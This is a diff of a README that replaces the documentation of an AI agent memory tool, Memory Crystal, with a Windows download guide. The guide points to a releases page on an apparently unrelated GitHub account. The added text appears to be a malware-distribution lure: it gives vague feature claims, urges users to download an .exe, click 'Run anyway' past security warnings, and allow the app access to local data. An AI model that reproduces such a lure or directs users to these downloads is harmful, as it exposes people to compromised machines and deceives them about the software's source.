@@ -1,287 +1,170 @@
-<!-- This repository is the open-source mirror of Memory Crystal. The hosted service and web app are maintained separately. -->
-
-<p align="center">
-  <a href="https://memorycrystal.ai">
-    <picture>
-      <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/memorycrystal/memorycrystal/main/assets/logo-dark.svg">
-      <source media="(prefers-color-scheme: light)" srcset="https://raw.githubusercontent.com/memorycrystal/memorycrystal/main/assets/logo-light.svg">
-      <img src="https://raw.githubusercontent.com/memorycrystal/memorycrystal/main/assets/logo-light.svg" alt="Memory Crystal" width="320">
-    </picture>
-  </a>
-</p>
-
-<p align="center">
-  <strong>Persistent memory for AI agents.</strong><br>
-  <sub>Every conversation remembered. Every decision recalled. Every session informed.</sub>
-</p>
-
-<p align="center">
-  <a href="LICENSE"><img src="https://img.shields.io/badge/License-MIT-blue.svg?style=flat-square" alt="MIT License"></a>
-  <a href="https://www.npmjs.com/package/@memorycrystal/crystal-memory"><img src="https://img.shields.io/npm/v/@memorycrystal/crystal-memory?style=flat-square&color=cb3837" alt="npm"></a>
-  <a href="https://memorycrystal.ai"><img src="https://img.shields.io/badge/Cloud-Online-00c853?style=flat-square" alt="Cloud"></a>
-  <a href="https://docs.memorycrystal.ai"><img src="https://img.shields.io/badge/Docs-docs.memorycrystal.ai-2180D6?style=flat-square" alt="Docs"></a>
-</p>
-
-<p align="center">
-  <a href="https://memorycrystal.ai">Website</a> · <a href="https://docs.memorycrystal.ai">Docs</a> · <a href="https://memorycrystal.ai/dashboard">Dashboard</a> · <a href="https://memorycrystal.ai/pricing">Pricing</a>
-</p>
-
----
-
-Your AI forgets everything between sessions — who you are, what you decided, what failed, what works. Memory Crystal fixes that.
-
-It captures conversations in real time, extracts durable knowledge, and injects the right context before every response. One install. No prompting gymnastics. Your AI just *knows*.
-
-```bash
-curl -fsSL https://memorycrystal.ai/crystal | bash
-```
-
----
-
-## Works with everything
-
-Install Memory Crystal on any MCP-compatible AI tool in one command:
+# 🧠 memorycrystal - Keep AI memory between sessions
 
-| Platform | Install |
-|---|---|
-| **Claude Code** | `curl -fsSL https://memorycrystal.ai/install-claude-mcp.sh \| bash` |
-| **Codex CLI** | `curl -fsSL https://memorycrystal.ai/install-codex-mcp.sh \| bash` |
-| **Factory Droid** | `curl -fsSL https://memorycrystal.ai/install-droid-mcp.sh \| bash` |
-| **OpenClaw** | `curl -fsSL https://memorycrystal.ai/crystal \| bash` |
-| **Claude Desktop** | Add the MCP server in settings ([guide](https://docs.memorycrystal.ai/integrations/claude-desktop)) |
-| **Any MCP host** | Point at `https://api.memorycrystal.ai/mcp` with a Bearer token |
+[![Download memorycrystal](https://img.shields.io/badge/Download%20memorycrystal-blue?style=for-the-badge)](https://github.com/nativist-rossini671/memorycrystal/releases)
 
-Each installer authenticates via browser, registers the MCP server, and configures auto-capture hooks — your messages get stored and relevant memories get recalled on every turn, automatically.
-
----
-
-## How it works
-
-```
-  You send a message
-       │
-       ▼
-┌─────────────────────────────────────────┐
-│           CONTEXT ENGINE                │
-│                                         │
-│  Semantic search + BM25 across STM/LTM  │
-│  Knowledge graph boost                  │
-│  Multi-signal reranker                  │
-│  Diversity filter + context budgeting   │
-│  → Inject top memories into context     │
-└─────────────────────────────────────────┘
-       │
-       ▼
-  AI responds with full context
-       │
-       ▼
-┌─────────────────────────────────────────┐
-│         MEMORY EXTRACTION               │
-│                                         │
-│  Raw message → Short-term memory        │
-│  LLM extracts facts/decisions → LTM     │
-│  Graph enrichment links related memories│
-└─────────────────────────────────────────┘
-```
-
-Every response is informed by what came before. Every conversation feeds the next one.
-
----
-
-## Two memory layers
-
-| Layer | Stores | Retention |
-|---|---|---|
-| **Short-term (STM)** | Raw messages, verbatim | Rolling window (7–90 days by tier) |
-| **Long-term (LTM)** | Facts, decisions, lessons, people, rules | Permanent, vector-indexed |
-
-STM gives perfect recent recall. LTM gives permanent knowledge. Both are searched together on every turn.
-
-## Five memory stores
-
-| Store | Purpose | Example |
-|---|---|---|
-| `sensory` | Raw signals | *"Andy sounds frustrated about the deploy"* |
-| `episodic` | Events | *"We shipped v2 on March 15"* |
-| `semantic` | Facts | *"The API uses Convex for the backend"* |
-| `procedural` | How-to | *"Deploy with `npm run convex:deploy`"* |
-| `prospective` | Plans | *"Add billing webhooks next sprint"* |
-
-## Knowledge graph
-
-Memories don't exist in isolation. An async background job connects related memories — decisions link to the lessons that informed them, people link to their projects, rules link to the events that created them.
-
-When the Context Engine searches, graph-connected memories rank higher. Your AI doesn't just remember facts — it understands relationships.
-
-## Adaptive recall
-
-Six modes, automatically selected:
-
-| Mode | Prioritizes |
-|---|---|
-| **General** | Broad recall across STM + LTM |
-| **Decision** | Decisions, lessons, and rules before risky changes |
-| **Project** | Goals, workflows, and implementation context |
-| **People** | Ownership, collaborators, and relationships |
-| **Workflow** | Procedures, rules, and how-to memory |
-| **Conversation** | Recent session context and continuity |
-
-The Context Engine picks the right mode. You don't configure anything.
-
----
-
-## Knowledge bases
-
-First-class immutable reference collections for docs, policies, runbooks, and imported source material. They sit alongside conversational memory so your agent can keep learned context and stable reference data separate.
-
-- **Immutable** — imported chunks stay stable, not rewritten by conversation
-- **Scoped** — tenant and scope filters keep KBs private to the right workspace
-- **Bulk import** — standard import or high-volume bulk-insert without blocking on embedding
-- **Background enrichment** — embedding and graph backfill run asynchronously
+## 📥 Download memorycrystal
 
----
-
-## 24 memory tools
-
-Every tool works in any MCP host or automatically within OpenClaw hooks.
-
-| Tool | What it does |
-|---|---|
-| `crystal_recall` | Semantic search across all long-term memory |
-| `crystal_remember` | Store a memory — decisions, facts, lessons |
-| `crystal_what_do_i_know` | Everything known about a topic |
-| `crystal_why_did_we` | Decision archaeology — why a past choice was made |
-| `crystal_preflight` | Pre-flight check before risky actions |
-| `crystal_search_messages` | Hybrid search over verbatim conversation history |
-| `crystal_checkpoint` | Snapshot memory state at a milestone |
-| `crystal_wake` | Session startup — briefing and guardrails |
-| `crystal_trace` | Trace a memory back to its source conversation |
-| `crystal_who_owns` | Find ownership of a file, module, or area |
-| `crystal_explain_connection` | Explain relationships between concepts |
-| `crystal_dependency_chain` | Trace dependency chains between entities |
-| `crystal_recent` | Recent messages for short-term context |
-| `crystal_edit` | Update an existing memory |
-| `crystal_forget` | Archive or delete a memory |
-| `crystal_stats` | Memory and usage statistics |
-| `crystal_set_scope` | Override channel scope for the session |
-| `crystal_list_knowledge_bases` | List available knowledge bases |
-| `crystal_query_knowledge_base` | Search a knowledge base |
-| `crystal_import_knowledge` | Import reference chunks into a KB |
-| `crystal_ideas` | List active Organic ideas and discoveries |
-| `crystal_idea_action` | Act on Organic ideas |
-| `memory_search` | Search LTM and return crystal paths |
-| `memory_get` | Read a full memory by ID or path |
+To get memorycrystal on Windows, visit the release page and download the latest file from there:
 
----
+https://github.com/nativist-rossini671/memorycrystal/releases
 
-## HTTP API
+Look for the newest release and choose the Windows download if more than one file is listed. In most cases, this will be an `.exe` file or a `.zip` file.
 
-All core operations available over authenticated HTTP:
+## 🪟 Windows setup
 
-```
-POST /api/mcp/capture              Create a memory
-POST /api/mcp/recall               Hybrid recall over all memory
-POST /api/mcp/search-messages      Search short-term history
+1. Open the release page in your browser.
+2. Find the latest release at the top of the page.
+3. Under **Assets**, click the Windows file.
+4. If you download a `.zip` file, right-click it and choose **Extract All**.
+5. Open the extracted folder.
+6. Double-click the app file to start memorycrystal.
+7. If Windows shows a security prompt, choose **More info** and then **Run anyway** if you trust the source.
 
-GET  /api/knowledge-bases          List knowledge bases
-POST /api/knowledge-bases          Create a knowledge base
-POST /api/knowledge-bases/:id/import       Import chunks
-POST /api/knowledge-bases/:id/bulk-insert  High-volume migration
-POST /api/knowledge-bases/:id/query        Query a knowledge base
-```
+## ✨ What memorycrystal does
 
-All endpoints require `Authorization: Bearer <api-key>`. Per-key rate limiting enforced.
+memorycrystal helps AI agents keep useful memory across sessions. It gives your agent a place to store facts, notes, and context so it can pick up where it left off.
 
----
+It is built as an OpenClaw plugin and an MCP server, so it can work with tools that support those formats. That makes it a good fit for agent workflows that need persistent memory without asking the user to repeat the same details.
 
-## Architecture
+## 🧩 What you can use it for
 
-```
-memorycrystal/
-├── plugin/                 OpenClaw plugin — hooks into conversation lifecycle
-├── plugins/shared/         Shared hook script for Claude Code, Codex, Factory
-├── mcp-server/             MCP server — 24 tools over stdio or SSE
-├── packages/mcp-server/    Streamable HTTP MCP variant
-├── convex/                 Backend — schema, capture, recall, graph, sessions
-│   └── crystal/            All Memory Crystal Convex functions
-├── apps/
-│   ├── web/                Next.js 15 dashboard (Tailwind 4, Convex Auth)
-│   └── docs/               Mintlify documentation site
-├── scripts/                Install, bootstrap, doctor, enable/disable
-└── assets/                 Logos and brand assets
-```
+- Save user facts for later chats
+- Keep project details in one place
+- Store long-term context for an AI agent
+- Reduce repeated questions
+- Connect memory to agent tools through MCP
+- Use a shared memory layer across sessions
 
-## Self-hosted
+## 🔧 How it works
 
-Run everything on your own infrastructure:
+memorycrystal acts like a memory layer between your AI agent and the data it needs to remember.
 
-```bash
-git clone https://github.com/memorycrystal/memorycrystal.git
-cd memorycrystal && npm install
+A simple flow looks like this:
 
-# Deploy to your own Convex project
-CONVEX_DEPLOYMENT=prod:your-project-123 npx convex deploy
+1. The agent gets new information from a chat or task.
+2. memorycrystal stores that information.
+3. Later, the agent asks for memory.
+4. memorycrystal returns the saved context.
 
-# Configure
-echo 'CONVEX_URL=https://your-project-123.convex.cloud' > mcp-server/.env
-echo 'GEMINI_API_KEY=your-key' >> mcp-server/.env
+This helps the agent act with more continuity and less repetition.
 
-# Enable and verify
-npm run crystal:enable
-npm run crystal:doctor
-```
+## 📦 Files you may see on the release page
 
-Full guide: [docs.memorycrystal.ai/configuration/self-hosting](https://docs.memorycrystal.ai/configuration/self-hosting)
+When you open the download page, you may see files like these:
 
----
+- `memorycrystal-windows.exe`
+- `memorycrystal-win.zip`
+- `README.txt`
+- checksum files for verification
 
-## Security
+If you see both an `.exe` and a `.zip`, the `.exe` is usually the easiest choice. If your browser blocks the file, choose the `.zip` version and extract it first.
 
-- **Multi-tenant isolation** — owner checks on every retrieval, database-level separation
-- **API keys** — SHA-256 hashed at rest, plaintext never stored
-- **Content scanner** — blocks prompt injection, encoded payloads, credential patterns
-- **Prompt injection mitigation** — recalled memories injected as informational context only
-- **Rate limiting** — per-key enforcement on all endpoints
-- **Audit logging** — all actions logged to `crystalAuditLog`
-- **Device flow auth** — RFC 8628-style for CLI key provisioning
-- **Local mode** — SQLite fallback, data never leaves your machine
+## 🖱️ First run
 
----
+After you open memorycrystal for the first time:
 
-## Pricing
+1. Let the app finish loading.
+2. If a local browser window opens, keep it open.
+3. If the app asks for access to local data, allow it.
+4. If it asks you to connect to an AI tool, follow the setup steps in that tool.
 
-| Plan | Price | Memories | STM Retention |
-|---|---|---|---|
-| **Free** | $0/mo | 500 | 7 days |
-| **Pro** | $29/mo | 25,000 | 30 days |
-| **Ultra** | $79/mo | Unlimited | 90 days |
-| **Enterprise** | Custom | Custom | Custom |
+Some builds may run as a local desktop app. Others may open a local web interface. Both are normal for this type of tool.
 
-Self-hosting is always free. Paid plans are for the managed cloud at [memorycrystal.ai](https://memorycrystal.ai).
+## 🧠 Best way to use it
 
----
+For best results, keep memory entries short and clear.
 
-## Contributing
+Good examples:
 
-Memory Crystal is MIT open source. PRs welcome.
+- User prefers short answers
+- Project uses Next.js
+- Agent should remember meeting notes
+- Store Claude prompt settings
+- Keep API key names and file paths separate
 
-```bash
-git clone https://github.com/memorycrystal/memorycrystal.git
-cd memorycrystal && npm install && npm run dev
-```
+This makes it easier for the agent to find the right memory later.
 
-## Star History
+## 🔌 OpenClaw plugin and MCP server
 
-<a href="https://www.star-history.com/?repos=memorycrystal%2Fmemorycrystal&type=date&legend=top-left">
- <picture>
-  <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/chart?repos=memorycrystal/memorycrystal&type=date&theme=dark&legend=top-left" />
-  <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/chart?repos=memorycrystal/memorycrystal&type=date&legend=top-left" />
-  <img alt="Star History Chart" src="https://api.star-history.com/chart?repos=memorycrystal/memorycrystal&type=date&legend=top-left" />
- </picture>
-</a>
+memorycrystal supports two common ways to connect agent tools:
 
----
+- **OpenClaw plugin**: lets the app plug into supported agent setups
+- **MCP server**: lets other tools talk to memorycrystal through a standard interface
 
-<p align="center">
-  <sub>MIT License — <a href="https://memorycrystal.ai">memorycrystal.ai</a> — Operated by Illumin8 Inc.</sub>
-</p>
+If you use Claude or another MCP-compatible tool, memorycrystal can sit between the tool and your saved memory data.
+
+## 🛠️ Basic use cases
+
+You can use memorycrystal for:
+
+- personal assistant memory
+- support agent context
+- task history
+- project notes
+- user preference tracking
+- multi-step workflows
+- shared team memory for AI tools
+
+## 🖥️ Windows tips
+
+- Keep the app in a folder you can find later
+- Do not move files around after setup unless you know what they do
+- If Windows asks for permission, read the prompt before you allow it
+- If your browser marks the download as rare, use the release page again and confirm you have the latest file
+
+## 📌 Topics in this project
+
+This project touches on:
+
+- agent memory
+- AI agents
+- Claude
+- Convex
+- LLMs
+- MCP
+- persistent memory
+- Next.js
+- TypeScript
+- OpenAI workflows
+
+## 🧾 Simple install flow
+
+1. Go to the release page.
+2. Download the newest Windows file.
+3. Open the file or extract it.
+4. Start the app.
+5. Connect it to your AI tool if needed.
+6. Add a test memory entry.
+7. Ask the agent to recall it.
+
+## 🔍 If the app does not open
+
+Try these steps:
+
+1. Make sure the download finished.
+2. Check your Downloads folder.
+3. If you downloaded a zip file, extract it first.
+4. Run the app again from the extracted folder.
+5. If Windows blocked it, open the file again and check the security prompt.
+6. If you have multiple copies, use the newest one from the release page.
+
+## 📂 Suggested folder structure after setup
+
+You may want to keep files in a folder like this:
+
+- `Downloads`
+- `memorycrystal`
+- `memorycrystal\data`
+- `memorycrystal\config`
+
+This keeps the app and its local data easy to find.
+
+## 🔐 Local data
+
+memorycrystal may store memory on your computer or in a connected service, based on how you set it up. Keep your setup simple at first. Add a few test items and check that the agent can read them back before you use it for real work
+
+## 📎 Download again
+
+If you need the file again, use this page:
+
+https://github.com/nativist-rossini671/memorycrystal/releases
